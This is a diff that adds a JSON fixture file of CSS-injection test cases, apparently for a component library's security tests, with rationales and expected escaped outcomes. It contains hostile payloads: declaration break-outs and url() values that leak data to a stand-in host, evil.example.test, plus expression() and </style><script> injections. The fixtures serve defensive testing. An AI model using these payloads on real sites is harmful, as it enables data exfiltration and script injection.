@@ -1,0 +1,54 @@
+{
+  "schemaVersion": "1.0.0",
+  "category": "css-injection",
+  "description": "Host-supplied strings that reach a CSS value — a colour prop, an inline style binding, a custom-property override. CSS injection rarely executes script on a current engine; what it reliably does is exfiltrate (an attribute-selector plus a `url()` leaks a value one request at a time), overlay (position a transparent element over a real control) and erase (paint a security-relevant element out of existence). The required outcome for a style sink is `escaped`: the value stays in the one declaration it was given and cannot open a second one.",
+  "fixtures": [
+    {
+      "id": "css-injection.declaration.break-out",
+      "category": "css-injection",
+      "title": "closing one declaration to start another",
+      "payload": "red;background:url(https://evil.example.test/p)",
+      "outcomes": {
+        "style": "escaped",
+        "attribute": "escaped"
+      },
+      "rationale": "The base case for any prop whose value is concatenated into a style string. When the value is set through an element attribute or a Vue `:style` object the semicolon is data and the whole declaration is simply invalid, which is `escaped`; when it is concatenated into a stylesheet it is a second declaration.",
+      "provenance": "OWASP CSS-injection guidance; standard style-context test."
+    },
+    {
+      "id": "css-injection.expression.legacy",
+      "category": "css-injection",
+      "title": "legacy IE expression() value",
+      "payload": "expression(alert(1))",
+      "outcomes": {
+        "style": "escaped"
+      },
+      "rationale": "Dead on every supported engine, kept for the same reason as `vbscript:` in the URL file: it distinguishes a component that validates its CSS values from one that happens not to be attacked by the vectors somebody remembered.",
+      "provenance": "OWASP filter-evasion cheat sheet, CSS section."
+    },
+    {
+      "id": "css-injection.url.exfiltration",
+      "category": "css-injection",
+      "title": "url() pointing off-origin",
+      "payload": "url(\"https://evil.example.test/?c=leak\")",
+      "outcomes": {
+        "style": "escaped"
+      },
+      "rationale": "The realistic CSS attack in a component library: no script, one request, and whatever the selector could distinguish is now known off-origin. It is also the case that shows a component's CSS surface is governed by the host's CSP `img-src`/`default-src` and not by anything the component can decide alone.",
+      "provenance": "CSS-exfiltration literature (attribute-selector leak); OWASP guidance."
+    },
+    {
+      "id": "css-injection.style.close-tag",
+      "category": "css-injection",
+      "title": "closing a style element and opening a script",
+      "payload": "</style><script>alert(1)</script>",
+      "outcomes": {
+        "style": "escaped",
+        "text": "escaped",
+        "html": "stripped"
+      },
+      "rationale": "For any value written into a `<style>` element rather than an attribute — the theme-injection path. The tokenizer leaves the style element on the literal `</style`, so quoting inside CSS does not contain it.",
+      "provenance": "HTML Standard raw-text end-tag tokenizer states; cure53 style-context cases."
+    }
+  ]
+}
